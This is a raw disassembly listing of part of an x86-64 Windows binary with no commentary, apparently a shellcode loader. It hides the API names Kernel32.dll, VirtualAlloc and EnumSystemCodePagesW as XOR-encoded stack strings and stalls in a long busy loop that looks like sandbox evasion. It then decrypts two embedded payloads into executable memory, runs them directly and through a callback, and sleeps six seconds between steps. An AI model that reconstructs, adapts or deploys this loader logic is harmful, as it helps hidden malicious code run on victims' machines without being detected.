  403e50:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
  403e55:	48 89 d9             	mov    %rbx,%rcx
  403e58:	e8 f3 6a 00 00       	call   0x40a950
  403e5d:	83 f8 03             	cmp    $0x3,%eax
  403e60:	0f 84 93 00 00 00    	je     0x403ef9
  403e66:	48 89 d9             	mov    %rbx,%rcx
  403e69:	e8 ea 6a 00 00       	call   0x40a958
  403e6e:	48 8d 9c 24 d0 00 00 	lea    0xd0(%rsp),%rbx
  403e75:	00 
  403e76:	b9 06 00 00 00       	mov    $0x6,%ecx
  403e7b:	31 c0                	xor    %eax,%eax
  403e7d:	48 8b 2d d0 e9 15 00 	mov    0x15e9d0(%rip),%rbp        # 0x562854
  403e84:	48 8b 35 91 e9 15 00 	mov    0x15e991(%rip),%rsi        # 0x56281c
  403e8b:	48 89 df             	mov    %rbx,%rdi
  403e8e:	f3 48 ab             	rep stos %rax,(%rdi)
  403e91:	48 8b 3d 24 ea 15 00 	mov    0x15ea24(%rip),%rdi        # 0x5628bc
  403e98:	eb 10                	jmp    0x403eaa
  403e9a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  403ea0:	48 89 d9             	mov    %rbx,%rcx
  403ea3:	ff d7                	call   *%rdi
  403ea5:	48 89 d9             	mov    %rbx,%rcx
  403ea8:	ff d6                	call   *%rsi
  403eaa:	45 31 c9             	xor    %r9d,%r9d
  403ead:	45 31 c0             	xor    %r8d,%r8d
  403eb0:	31 d2                	xor    %edx,%edx
  403eb2:	48 89 d9             	mov    %rbx,%rcx
  403eb5:	ff d5                	call   *%rbp
  403eb7:	85 c0                	test   %eax,%eax
  403eb9:	75 e5                	jne    0x403ea0
  403ebb:	e8 b0 dc ff ff       	call   0x401b70
  403ec0:	b8 01 00 00 00       	mov    $0x1,%eax
  403ec5:	eb 1e                	jmp    0x403ee5
  403ec7:	41 b9 10 00 00 00    	mov    $0x10,%r9d
  403ecd:	4c 8d 05 ed 94 15 00 	lea    0x1594ed(%rip),%r8        # 0x55d3c1
  403ed4:	48 8d 15 ed 94 15 00 	lea    0x1594ed(%rip),%rdx        # 0x55d3c8
  403edb:	31 c9                	xor    %ecx,%ecx
  403edd:	ff 15 a9 e9 15 00    	call   *0x15e9a9(%rip)        # 0x56288c
  403ee3:	31 c0                	xor    %eax,%eax
  403ee5:	48 81 c4 68 03 00 00 	add    $0x368,%rsp
  403eec:	5b                   	pop    %rbx
  403eed:	5e                   	pop    %rsi
  403eee:	5f                   	pop    %rdi
  403eef:	5d                   	pop    %rbp
  403ef0:	41 5c                	pop    %r12
  403ef2:	41 5d                	pop    %r13
  403ef4:	41 5e                	pop    %r14
  403ef6:	41 5f                	pop    %r15
  403ef8:	c3                   	ret
  403ef9:	44 8b 05 40 c1 15 00 	mov    0x15c140(%rip),%r8d        # 0x560040
  403f00:	41 83 f8 09          	cmp    $0x9,%r8d
  403f04:	0f 8f 5c ff ff ff    	jg     0x403e66
  403f0a:	49 63 d0             	movslq %r8d,%rdx
  403f0d:	44 8b 4c 24 70       	mov    0x70(%rsp),%r9d
  403f12:	41 83 c0 01          	add    $0x1,%r8d
  403f16:	48 c1 e2 04          	shl    $0x4,%rdx
  403f1a:	44 89 05 1f c1 15 00 	mov    %r8d,0x15c11f(%rip)        # 0x560040
  403f21:	48 01 f2             	add    %rsi,%rdx
  403f24:	44 89 0a             	mov    %r9d,(%rdx)
  403f27:	44 8b 8c 24 80 00 00 	mov    0x80(%rsp),%r9d
  403f2e:	00 
  403f2f:	c7 42 0c 01 00 00 00 	movl   $0x1,0xc(%rdx)
  403f36:	44 89 4a 04          	mov    %r9d,0x4(%rdx)
  403f3a:	44 8b 8c 24 90 00 00 	mov    0x90(%rsp),%r9d
  403f41:	00 
  403f42:	44 89 4a 08          	mov    %r9d,0x8(%rdx)
  403f46:	e9 f1 fe ff ff       	jmp    0x403e3c
  403f4b:	4c 8d b4 24 70 02 00 	lea    0x270(%rsp),%r14
  403f52:	00 
  403f53:	c7 84 24 00 01 00 00 	movl   $0x4f,0x100(%rsp)
  403f5a:	4f 00 00 00 
  403f5e:	c7 84 24 04 01 00 00 	movl   $0x61,0x104(%rsp)
  403f65:	61 00 00 00 
  403f69:	c7 84 24 08 01 00 00 	movl   $0x76,0x108(%rsp)
  403f70:	76 00 00 00 
  403f74:	c7 84 24 0c 01 00 00 	movl   $0x6a,0x10c(%rsp)
  403f7b:	6a 00 00 00 
  403f7f:	48 8d 35 9a 70 00 00 	lea    0x709a(%rip),%rsi        # 0x40b020
  403f86:	c7 84 24 10 01 00 00 	movl   $0x61,0x110(%rsp)
  403f8d:	61 00 00 00 
  403f91:	c7 84 24 14 01 00 00 	movl   $0x68,0x114(%rsp)
  403f98:	68 00 00 00 
  403f9c:	b9 1e 00 00 00       	mov    $0x1e,%ecx
  403fa1:	c7 84 24 18 01 00 00 	movl   $0x37,0x118(%rsp)
  403fa8:	37 00 00 00 
  403fac:	c7 84 24 1c 01 00 00 	movl   $0x36,0x11c(%rsp)
  403fb3:	36 00 00 00 
  403fb7:	4c 89 f7             	mov    %r14,%rdi
  403fba:	c7 84 24 20 01 00 00 	movl   $0x2a,0x120(%rsp)
  403fc1:	2a 00 00 00 
  403fc5:	c7 84 24 24 01 00 00 	movl   $0x60,0x124(%rsp)
  403fcc:	60 00 00 00 
  403fd0:	f3 48 a5             	rep movsq (%rsi),(%rdi)
  403fd3:	c7 84 24 28 01 00 00 	movl   $0x68,0x128(%rsp)
  403fda:	68 00 00 00 
  403fde:	c7 84 24 2c 01 00 00 	movl   $0x68,0x12c(%rsp)
  403fe5:	68 00 00 00 
  403fe9:	c7 84 24 30 01 00 00 	movl   $0x4,0x130(%rsp)
  403ff0:	04 00 00 00 
  403ff4:	c7 84 24 40 01 00 00 	movl   $0x52,0x140(%rsp)
  403ffb:	52 00 00 00 
  403fff:	c7 84 24 44 01 00 00 	movl   $0x6d,0x144(%rsp)
  404006:	6d 00 00 00 
  40400a:	c7 84 24 48 01 00 00 	movl   $0x76,0x148(%rsp)
  404011:	76 00 00 00 
  404015:	c7 84 24 4c 01 00 00 	movl   $0x70,0x14c(%rsp)
  40401c:	70 00 00 00 
  404020:	c7 84 24 50 01 00 00 	movl   $0x71,0x150(%rsp)
  404027:	71 00 00 00 
  40402b:	c7 84 24 54 01 00 00 	movl   $0x65,0x154(%rsp)
  404032:	65 00 00 00 
  404036:	c7 84 24 58 01 00 00 	movl   $0x68,0x158(%rsp)
  40403d:	68 00 00 00 
  404041:	c7 84 24 5c 01 00 00 	movl   $0x45,0x15c(%rsp)
  404048:	45 00 00 00 
  40404c:	c7 84 24 60 01 00 00 	movl   $0x68,0x160(%rsp)
  404053:	68 00 00 00 
  404057:	c7 84 24 64 01 00 00 	movl   $0x68,0x164(%rsp)
  40405e:	68 00 00 00 
  404062:	c7 84 24 68 01 00 00 	movl   $0x6b,0x168(%rsp)
  404069:	6b 00 00 00 
  40406d:	c7 84 24 6c 01 00 00 	movl   $0x67,0x16c(%rsp)
  404074:	67 00 00 00 
  404078:	c7 84 24 70 01 00 00 	movl   $0x4,0x170(%rsp)
  40407f:	04 00 00 00 
  404083:	c7 84 24 80 01 00 00 	movl   $0x4f,0x180(%rsp)
  40408a:	4f 00 00 00 
  40408e:	c7 84 24 84 01 00 00 	movl   $0x62,0x184(%rsp)
  404095:	62 00 00 00 
  404099:	c7 84 24 88 01 00 00 	movl   $0x44,0x188(%rsp)
  4040a0:	44 00 00 00 
  4040a4:	c7 84 24 8c 01 00 00 	movl   $0x38,0x18c(%rsp)
  4040ab:	38 00 00 00 
  4040af:	c7 84 24 90 01 00 00 	movl   $0x4a,0x190(%rsp)
  4040b6:	4a 00 00 00 
  4040ba:	c7 84 24 94 01 00 00 	movl   $0x6c,0x194(%rsp)
  4040c1:	6c 00 00 00 
  4040c5:	81 3d 81 c0 15 00 00 	cmpl   $0x3b9aca00,0x15c081(%rip)        # 0x560150
  4040cc:	ca 9a 3b 
  4040cf:	c7 84 24 98 01 00 00 	movl   $0x6e,0x198(%rsp)
  4040d6:	6e 00 00 00 
  4040da:	c7 84 24 9c 01 00 00 	movl   $0x45,0x19c(%rsp)
  4040e1:	45 00 00 00 
  4040e5:	c7 84 24 a0 01 00 00 	movl   $0x75,0x1a0(%rsp)
  4040ec:	75 00 00 00 
  4040f0:	c7 84 24 a4 01 00 00 	movl   $0x67,0x1a4(%rsp)
  4040f7:	67 00 00 00 
  4040fb:	c7 84 24 a8 01 00 00 	movl   $0x75,0x1a8(%rsp)
  404102:	75 00 00 00 
  404106:	c7 84 24 ac 01 00 00 	movl   $0x42,0x1ac(%rsp)
  40410d:	42 00 00 00 
  404111:	c7 84 24 b0 01 00 00 	movl   $0x45,0x1b0(%rsp)
  404118:	45 00 00 00 
  40411c:	c7 84 24 b4 01 00 00 	movl   $0x60,0x1b4(%rsp)
  404123:	60 00 00 00 
  404127:	c7 84 24 b8 01 00 00 	movl   $0x1,0x1b8(%rsp)
  40412e:	01 00 00 00 
  404132:	c7 84 24 10 02 00 00 	movl   $0x41,0x210(%rsp)
  404139:	41 00 00 00 
  40413d:	c7 84 24 14 02 00 00 	movl   $0x6a,0x214(%rsp)
  404144:	6a 00 00 00 
  404148:	c7 84 24 18 02 00 00 	movl   $0x71,0x218(%rsp)
  40414f:	71 00 00 00 
  404153:	c7 84 24 1c 02 00 00 	movl   $0x69,0x21c(%rsp)
  40415a:	69 00 00 00 
  40415e:	c7 84 24 20 02 00 00 	movl   $0x57,0x220(%rsp)
  404165:	57 00 00 00 
  404169:	c7 84 24 24 02 00 00 	movl   $0x7d,0x224(%rsp)
  404170:	7d 00 00 00 
  404174:	c7 84 24 28 02 00 00 	movl   $0x77,0x228(%rsp)
  40417b:	77 00 00 00 
  40417f:	c7 84 24 2c 02 00 00 	movl   $0x70,0x22c(%rsp)
  404186:	70 00 00 00 
  40418a:	c7 84 24 30 02 00 00 	movl   $0x61,0x230(%rsp)
  404191:	61 00 00 00 
  404195:	c7 84 24 34 02 00 00 	movl   $0x69,0x234(%rsp)
  40419c:	69 00 00 00 
  4041a0:	c7 84 24 38 02 00 00 	movl   $0x47,0x238(%rsp)
  4041a7:	47 00 00 00 
  4041ab:	c7 84 24 3c 02 00 00 	movl   $0x6b,0x23c(%rsp)
  4041b2:	6b 00 00 00 
  4041b6:	c7 84 24 40 02 00 00 	movl   $0x60,0x240(%rsp)
  4041bd:	60 00 00 00 
  4041c1:	c7 84 24 44 02 00 00 	movl   $0x61,0x244(%rsp)
  4041c8:	61 00 00 00 
  4041cc:	c7 84 24 48 02 00 00 	movl   $0x54,0x248(%rsp)
  4041d3:	54 00 00 00 
  4041d7:	c7 84 24 4c 02 00 00 	movl   $0x65,0x24c(%rsp)
  4041de:	65 00 00 00 
  4041e2:	c7 84 24 50 02 00 00 	movl   $0x63,0x250(%rsp)
  4041e9:	63 00 00 00 
  4041ed:	c7 84 24 54 02 00 00 	movl   $0x61,0x254(%rsp)
  4041f4:	61 00 00 00 
  4041f8:	c7 84 24 58 02 00 00 	movl   $0x77,0x258(%rsp)
  4041ff:	77 00 00 00 
  404203:	c7 84 24 5c 02 00 00 	movl   $0x53,0x25c(%rsp)
  40420a:	53 00 00 00 
  40420e:	c7 84 24 60 02 00 00 	movl   $0x4,0x260(%rsp)
  404215:	04 00 00 00 
  404219:	48 8b 35 a4 e6 15 00 	mov    0x15e6a4(%rip),%rsi        # 0x5628c4
  404220:	7f 1a                	jg     0x40423c
  404222:	31 c9                	xor    %ecx,%ecx
  404224:	ff d6                	call   *%rsi
  404226:	8b 05 24 bf 15 00    	mov    0x15bf24(%rip),%eax        # 0x560150
  40422c:	83 c0 01             	add    $0x1,%eax
  40422f:	3d 00 ca 9a 3b       	cmp    $0x3b9aca00,%eax
  404234:	89 05 16 bf 15 00    	mov    %eax,0x15bf16(%rip)        # 0x560150
  40423a:	7e e6                	jle    0x404222
  40423c:	31 f6                	xor    %esi,%esi
  40423e:	44 8b 9c b4 00 01 00 	mov    0x100(%rsp,%rsi,4),%r11d
  404245:	00 
  404246:	b9 20 00 00 00       	mov    $0x20,%ecx
  40424b:	31 d2                	xor    %edx,%edx
  40424d:	b8 01 00 00 00       	mov    $0x1,%eax
  404252:	41 89 c2             	mov    %eax,%r10d
  404255:	41 89 d0             	mov    %edx,%r8d
  404258:	41 c1 ea 02          	shr    $0x2,%r10d
  40425c:	41 09 c0             	or     %eax,%r8d
  40425f:	41 83 e2 01          	and    $0x1,%r10d
  404263:	44 85 d8             	test   %r11d,%eax
  404266:	41 0f 95 c1          	setne  %r9b
  40426a:	45 38 ca             	cmp    %r9b,%r10b
  40426d:	41 0f 45 d0          	cmovne %r8d,%edx
  404271:	01 c0                	add    %eax,%eax
  404273:	83 e9 01             	sub    $0x1,%ecx
  404276:	75 da                	jne    0x404252
  404278:	88 94 34 a0 00 00 00 	mov    %dl,0xa0(%rsp,%rsi,1)
  40427f:	48 83 c6 01          	add    $0x1,%rsi
  404283:	48 83 fe 0d          	cmp    $0xd,%rsi
  404287:	75 b5                	jne    0x40423e
  404289:	48 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%rcx
  404290:	00 
  404291:	31 f6                	xor    %esi,%esi
  404293:	ff 15 3b e3 15 00    	call   *0x15e33b(%rip)        # 0x5625d4
  404299:	48 89 44 24 68       	mov    %rax,0x68(%rsp)
  40429e:	44 8b 9c b4 40 01 00 	mov    0x140(%rsp,%rsi,4),%r11d
  4042a5:	00 
  4042a6:	b9 20 00 00 00       	mov    $0x20,%ecx
  4042ab:	31 d2                	xor    %edx,%edx
  4042ad:	b8 01 00 00 00       	mov    $0x1,%eax
  4042b2:	41 89 c2             	mov    %eax,%r10d
  4042b5:	41 89 d0             	mov    %edx,%r8d
  4042b8:	41 c1 ea 02          	shr    $0x2,%r10d
  4042bc:	41 09 c0             	or     %eax,%r8d
  4042bf:	41 83 e2 01          	and    $0x1,%r10d
  4042c3:	44 85 d8             	test   %r11d,%eax
  4042c6:	41 0f 95 c1          	setne  %r9b
  4042ca:	45 38 ca             	cmp    %r9b,%r10b
  4042cd:	41 0f 45 d0          	cmovne %r8d,%edx
  4042d1:	01 c0                	add    %eax,%eax
  4042d3:	83 e9 01             	sub    $0x1,%ecx
  4042d6:	75 da                	jne    0x4042b2
  4042d8:	88 94 34 b0 00 00 00 	mov    %dl,0xb0(%rsp,%rsi,1)
  4042df:	48 83 c6 01          	add    $0x1,%rsi
  4042e3:	48 83 fe 0d          	cmp    $0xd,%rsi
  4042e7:	75 b5                	jne    0x40429e
  4042e9:	48 8d ac 24 c0 01 00 	lea    0x1c0(%rsp),%rbp
  4042f0:	00 
  4042f1:	48 8d 94 24 b0 00 00 	lea    0xb0(%rsp),%rdx
  4042f8:	00 
  4042f9:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
  4042fe:	48 8b 35 87 e2 15 00 	mov    0x15e287(%rip),%rsi        # 0x56258c
  404305:	ff d6                	call   *%rsi
  404307:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  40430d:	48 89 c7             	mov    %rax,%rdi
  404310:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
  404316:	ba 00 96 0e 00       	mov    $0xe9600,%edx
  40431b:	31 c9                	xor    %ecx,%ecx
  40431d:	ff d0                	call   *%rax
  40431f:	41 b9 40 00 00 00    	mov    $0x40,%r9d
  404325:	49 89 c4             	mov    %rax,%r12
  404328:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
  40432e:	ba 00 86 06 00       	mov    $0x68600,%edx
  404333:	31 c9                	xor    %ecx,%ecx
  404335:	ff d7                	call   *%rdi
  404337:	31 ff                	xor    %edi,%edi
  404339:	49 89 c5             	mov    %rax,%r13
  40433c:	0f 1f 40 00          	nopl   0x0(%rax)
  404340:	45 8b 1c be          	mov    (%r14,%rdi,4),%r11d
  404344:	b9 20 00 00 00       	mov    $0x20,%ecx
  404349:	31 d2                	xor    %edx,%edx
  40434b:	b8 01 00 00 00       	mov    $0x1,%eax
  404350:	41 89 d0             	mov    %edx,%r8d
  404353:	89 c3                	mov    %eax,%ebx
  404355:	41 09 c0             	or     %eax,%r8d
  404358:	83 e3 01             	and    $0x1,%ebx
  40435b:	44 85 d8             	test   %r11d,%eax
  40435e:	41 0f 95 c1          	setne  %r9b
  404362:	44 38 cb             	cmp    %r9b,%bl
  404365:	41 0f 45 d0          	cmovne %r8d,%edx
  404369:	01 c0                	add    %eax,%eax
  40436b:	83 e9 01             	sub    $0x1,%ecx
  40436e:	75 e0                	jne    0x404350
  404370:	88 54 3d 00          	mov    %dl,0x0(%rbp,%rdi,1)
  404374:	48 83 c7 01          	add    $0x1,%rdi
  404378:	48 83 ff 3c          	cmp    $0x3c,%rdi
  40437c:	75 c2                	jne    0x404340
  40437e:	31 db                	xor    %ebx,%ebx
  404380:	48 8d bc 24 c0 00 00 	lea    0xc0(%rsp),%rdi
  404387:	00 
  404388:	49 89 de             	mov    %rbx,%r14
  40438b:	46 8b 9c b4 80 01 00 	mov    0x180(%rsp,%r14,4),%r11d
  404392:	00 
  404393:	b9 20 00 00 00       	mov    $0x20,%ecx
  404398:	31 d2                	xor    %edx,%edx
  40439a:	b8 01 00 00 00       	mov    $0x1,%eax
  40439f:	90                   	nop
  4043a0:	41 89 d0             	mov    %edx,%r8d
  4043a3:	89 c3                	mov    %eax,%ebx
  4043a5:	41 09 c0             	or     %eax,%r8d
  4043a8:	83 e3 01             	and    $0x1,%ebx
  4043ab:	44 85 d8             	test   %r11d,%eax
  4043ae:	41 0f 95 c1          	setne  %r9b
  4043b2:	44 38 cb             	cmp    %r9b,%bl
  4043b5:	41 0f 45 d0          	cmovne %r8d,%edx
  4043b9:	01 c0                	add    %eax,%eax
  4043bb:	83 e9 01             	sub    $0x1,%ecx
  4043be:	75 e0                	jne    0x4043a0
  4043c0:	42 88 14 37          	mov    %dl,(%rdi,%r14,1)
  4043c4:	49 83 c6 01          	add    $0x1,%r14
  4043c8:	49 83 fe 0f          	cmp    $0xf,%r14
  4043cc:	75 bd                	jne    0x40438b
  4043ce:	4c 8d 35 6b f3 06 00 	lea    0x6f36b(%rip),%r14        # 0x473740
  4043d5:	31 db                	xor    %ebx,%ebx
  4043d7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4043de:	00 00 
  4043e0:	45 0f be 1c 1e       	movsbl (%r14,%rbx,1),%r11d
  4043e5:	48 89 e9             	mov    %rbp,%rcx
  4043e8:	8b 11                	mov    (%rcx),%edx
  4043ea:	48 83 c1 04          	add    $0x4,%rcx
  4043ee:	8d 82 ff fe fe fe    	lea    -0x1010101(%rdx),%eax
  4043f4:	f7 d2                	not    %edx
  4043f6:	21 d0                	and    %edx,%eax
  4043f8:	25 80 80 80 80       	and    $0x80808080,%eax
  4043fd:	74 e9                	je     0x4043e8
  4043ff:	89 c2                	mov    %eax,%edx
  404401:	41 b8 20 00 00 00    	mov    $0x20,%r8d
  404407:	c1 ea 10             	shr    $0x10,%edx
  40440a:	a9 80 80 00 00       	test   $0x8080,%eax
  40440f:	0f 44 c2             	cmove  %edx,%eax
  404412:	48 8d 51 02          	lea    0x2(%rcx),%rdx
  404416:	48 0f 44 ca          	cmove  %rdx,%rcx
  40441a:	00 c0                	add    %al,%al
  40441c:	48 89 d8             	mov    %rbx,%rax
  40441f:	48 83 d9 03          	sbb    $0x3,%rcx
  404423:	31 d2                	xor    %edx,%edx
  404425:	48 29 e9             	sub    %rbp,%rcx
  404428:	48 f7 f1             	div    %rcx
  40442b:	31 c9                	xor    %ecx,%ecx
  40442d:	44 0f be bc 14 c0 01 	movsbl 0x1c0(%rsp,%rdx,1),%r15d
  404434:	00 00 
  404436:	ba 01 00 00 00       	mov    $0x1,%edx
  40443b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  404440:	89 c8                	mov    %ecx,%eax
  404442:	09 d0                	or     %edx,%eax
  404444:	44 85 da             	test   %r11d,%edx
  404447:	41 0f 95 c2          	setne  %r10b
  40444b:	44 85 fa             	test   %r15d,%edx
  40444e:	41 0f 95 c1          	setne  %r9b
  404452:	45 38 ca             	cmp    %r9b,%r10b
  404455:	0f 45 c8             	cmovne %eax,%ecx
  404458:	01 d2                	add    %edx,%edx
  40445a:	41 83 e8 01          	sub    $0x1,%r8d
  40445e:	75 e0                	jne    0x404440
  404460:	41 88 0c 1c          	mov    %cl,(%r12,%rbx,1)
  404464:	48 83 c3 01          	add    $0x1,%rbx
  404468:	48 81 fb 00 96 0e 00 	cmp    $0xe9600,%rbx
  40446f:	0f 85 6b ff ff ff    	jne    0x4043e0
  404475:	48 8d 2d c4 6c 00 00 	lea    0x6cc4(%rip),%rbp        # 0x40b140
  40447c:	31 db                	xor    %ebx,%ebx
  40447e:	66 90                	xchg   %ax,%ax
  404480:	44 0f be 74 1d 00    	movsbl 0x0(%rbp,%rbx,1),%r14d
  404486:	48 89 f9             	mov    %rdi,%rcx
  404489:	8b 11                	mov    (%rcx),%edx
  40448b:	48 83 c1 04          	add    $0x4,%rcx
  40448f:	8d 82 ff fe fe fe    	lea    -0x1010101(%rdx),%eax
  404495:	f7 d2                	not    %edx
  404497:	21 d0                	and    %edx,%eax
  404499:	25 80 80 80 80       	and    $0x80808080,%eax
  40449e:	74 e9                	je     0x404489
  4044a0:	89 c2                	mov    %eax,%edx
  4044a2:	41 b8 20 00 00 00    	mov    $0x20,%r8d
  4044a8:	c1 ea 10             	shr    $0x10,%edx
  4044ab:	a9 80 80 00 00       	test   $0x8080,%eax
  4044b0:	0f 44 c2             	cmove  %edx,%eax
  4044b3:	48 8d 51 02          	lea    0x2(%rcx),%rdx
  4044b7:	48 0f 44 ca          	cmove  %rdx,%rcx
  4044bb:	00 c0                	add    %al,%al
  4044bd:	48 89 d8             	mov    %rbx,%rax
  4044c0:	48 83 d9 03          	sbb    $0x3,%rcx
  4044c4:	31 d2                	xor    %edx,%edx
  4044c6:	48 29 f9             	sub    %rdi,%rcx
  4044c9:	48 f7 f1             	div    %rcx
  4044cc:	31 c9                	xor    %ecx,%ecx
  4044ce:	0f be 84 14 c0 00 00 	movsbl 0xc0(%rsp,%rdx,1),%eax
  4044d5:	00 
  4044d6:	ba 01 00 00 00       	mov    $0x1,%edx
  4044db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
  4044e0:	41 89 c9             	mov    %ecx,%r9d
  4044e3:	41 09 d1             	or     %edx,%r9d
  4044e6:	44 85 f2             	test   %r14d,%edx
  4044e9:	41 0f 95 c3          	setne  %r11b
  4044ed:	85 c2                	test   %eax,%edx
  4044ef:	41 0f 95 c2          	setne  %r10b
  4044f3:	45 38 d3             	cmp    %r10b,%r11b
  4044f6:	41 0f 45 c9          	cmovne %r9d,%ecx
  4044fa:	01 d2                	add    %edx,%edx
  4044fc:	41 83 e8 01          	sub    $0x1,%r8d
  404500:	75 de                	jne    0x4044e0
  404502:	41 88 4c 1d 00       	mov    %cl,0x0(%r13,%rbx,1)
  404507:	48 83 c3 01          	add    $0x1,%rbx
  40450b:	48 81 fb 00 86 06 00 	cmp    $0x68600,%rbx
  404512:	0f 85 68 ff ff ff    	jne    0x404480
  404518:	48 8d 9c 24 d0 00 00 	lea    0xd0(%rsp),%rbx
  40451f:	00 
  404520:	31 ff                	xor    %edi,%edi
  404522:	41 ff d4             	call   *%r12
  404525:	b9 70 17 00 00       	mov    $0x1770,%ecx
  40452a:	ff 15 04 e1 15 00    	call   *0x15e104(%rip)        # 0x562634
  404530:	41 ff d5             	call   *%r13
  404533:	44 8b 9c bc 10 02 00 	mov    0x210(%rsp,%rdi,4),%r11d
  40453a:	00 
  40453b:	b9 20 00 00 00       	mov    $0x20,%ecx
  404540:	31 d2                	xor    %edx,%edx
  404542:	b8 01 00 00 00       	mov    $0x1,%eax
  404547:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  40454e:	00 00 
  404550:	41 89 c2             	mov    %eax,%r10d
  404553:	41 89 d0             	mov    %edx,%r8d
  404556:	41 c1 ea 02          	shr    $0x2,%r10d
  40455a:	41 09 c0             	or     %eax,%r8d
  40455d:	41 83 e2 01          	and    $0x1,%r10d
  404561:	44 85 d8             	test   %r11d,%eax
  404564:	41 0f 95 c1          	setne  %r9b
  404568:	45 38 ca             	cmp    %r9b,%r10b
  40456b:	41 0f 45 d0          	cmovne %r8d,%edx
  40456f:	01 c0                	add    %eax,%eax
  404571:	83 e9 01             	sub    $0x1,%ecx
  404574:	75 da                	jne    0x404550
  404576:	88 14 3b             	mov    %dl,(%rbx,%rdi,1)
  404579:	48 83 c7 01          	add    $0x1,%rdi
  40457d:	48 83 ff 15          	cmp    $0x15,%rdi
  404581:	75 b0                	jne    0x404533
  404583:	48 89 da             	mov    %rbx,%rdx
  404586:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
  40458b:	ff d6                	call   *%rsi
  40458d:	ba 01 00 00 00       	mov    $0x1,%edx
  404592:	4c 89 e1             	mov    %r12,%rcx
  404595:	ff d0                	call   *%rax
  404597:	31 c0                	xor    %eax,%eax
  404599:	e9 47 f9 ff ff       	jmp    0x403ee5
  40459e:	41 b9 10 00 00 00    	mov    $0x10,%r9d
  4045a4:	4c 8d 05 16 8e 15 00 	lea    0x158e16(%rip),%r8        # 0x55d3c1
  4045ab:	48 8d 15 ba 8e 15 00 	lea    0x158eba(%rip),%rdx        # 0x55d46c
  4045b2:	31 c9                	xor    %ecx,%ecx
  4045b4:	ff 15 d2 e2 15 00    	call   *0x15e2d2(%rip)        # 0x56288c
  4045ba:	31 c0                	xor    %eax,%eax
  4045bc:	e9 24 f9 ff ff       	jmp    0x403ee5
  4045c1:	90                   	nop
  4045c2:	90                   	nop
  4045c3:	90                   	nop
  4045c4:	90                   	nop
  4045c5:	90                   	nop
  4045c6:	90                   	nop
  4045c7:	90                   	nop
  4045c8:	90                   	nop
  4045c9:	90                   	nop
  4045ca:	90                   	nop
  4045cb:	90                   	nop
  4045cc:	90                   	nop
  4045cd:	90                   	nop
  4045ce:	90                   	nop
  4045cf:	90                   	nop
  4045d0:	48 83 ec 28          	sub    $0x28,%rsp
  4045d4:	85 d2                	test   %edx,%edx
  4045d6:	74 18                	je     0x4045f0
  4045d8:	83 fa 03             	cmp    $0x3,%edx
  4045db:	74 13                	je     0x4045f0
  4045dd:	b8 01 00 00 00       	mov    $0x1,%eax
  4045e2:	48 83 c4 28          	add    $0x28,%rsp
  4045e6:	c3                   	ret
  4045e7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  4045ee:	00 00 
  4045f0:	e8 db 14 00 00       	call   0x405ad0
  4045f5:	b8 01 00 00 00       	mov    $0x1,%eax
  4045fa:	48 83 c4 28          	add    $0x28,%rsp
  4045fe:	c3                   	ret
  4045ff:	90                   	nop
  404600:	56                   	push   %rsi
  404601:	53                   	push   %rbx
  404602:	48 83 ec 28          	sub    $0x28,%rsp
  404606:	83 3d 83 87 15 00 02 	cmpl   $0x2,0x158783(%rip)        # 0x55cd90
  40460d:	74 0a                	je     0x404619
  40460f:	c7 05 77 87 15 00 02 	movl   $0x2,0x158777(%rip)        # 0x55cd90
  404616:	00 00 00 
  404619:	83 fa 02             	cmp    $0x2,%edx
  40461c:	74 12                	je     0x404630
  40461e:	83 fa 01             	cmp    $0x1,%edx
  404621:	74 3f                	je     0x404662
  404623:	b8 01 00 00 00       	mov    $0x1,%eax
  404628:	48 83 c4 28          	add    $0x28,%rsp
  40462c:	5b                   	pop    %rbx
  40462d:	5e                   	pop    %rsi
  40462e:	c3                   	ret
  40462f:	90                   	nop
  404630:	48 8d 1d 29 fa 15 00 	lea    0x15fa29(%rip),%rbx        # 0x564060
  404637:	48 8d 35 22 fa 15 00 	lea    0x15fa22(%rip),%rsi        # 0x564060
  40463e:	48 39 f3             	cmp    %rsi,%rbx
  404641:	74 e0                	je     0x404623
  404643:	48 8b 03             	mov    (%rbx),%rax
  404646:	48 85 c0             	test   %rax,%rax
  404649:	74 02                	je     0x40464d
  40464b:	ff d0                	call   *%rax
  40464d:	48 83 c3 08          	add    $0x8,%rbx
  404651:	48 39 f3             	cmp    %rsi,%rbx
  404654:	75 ed                	jne    0x404643
  404656:	b8 01 00 00 00       	mov    $0x1,%eax
  40465b:	48 83 c4 28          	add    $0x28,%rsp
  40465f:	5b                   	pop    %rbx
  404660:	5e                   	pop    %rsi
  404661:	c3                   	ret
  404662:	e8 69 14 00 00       	call   0x405ad0
  404667:	eb ba                	jmp    0x404623
  404669:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
  404670:	31 c0                	xor    %eax,%eax
  404672:	c3                   	ret
  404673:	90                   	nop
  404674:	90                   	nop
  404675:	90                   	nop
  404676:	90                   	nop
  404677:	90                   	nop
  404678:	90                   	nop
  404679:	90                   	nop
  40467a:	90                   	nop
  40467b:	90                   	nop
  40467c:	90                   	nop
  40467d:	90                   	nop
  40467e:	90                   	nop
  40467f:	90                   	nop
  404680:	48 8b 05 15 e0 15 00 	mov    0x15e015(%rip),%rax        # 0x56269c
  404687:	48 ff e0             	rex.W jmp *%rax
  40468a:	90                   	nop
  40468b:	90                   	nop
  40468c:	90                   	nop
  40468d:	90                   	nop
  40468e:	90                   	nop
  40468f:	90                   	nop
  404690:	48 89 c8             	mov    %rcx,%rax
  404693:	c3                   	ret
  404694:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
  40469b:	00 00 00 00 00 
  4046a0:	48 89 c8             	mov    %rcx,%rax
  4046a3:	c3                   	ret
  4046a4:	90                   	nop
  4046a5:	90                   	nop
  4046a6:	90                   	nop
  4046a7:	90                   	nop
  4046a8:	90                   	nop
  4046a9:	90                   	nop
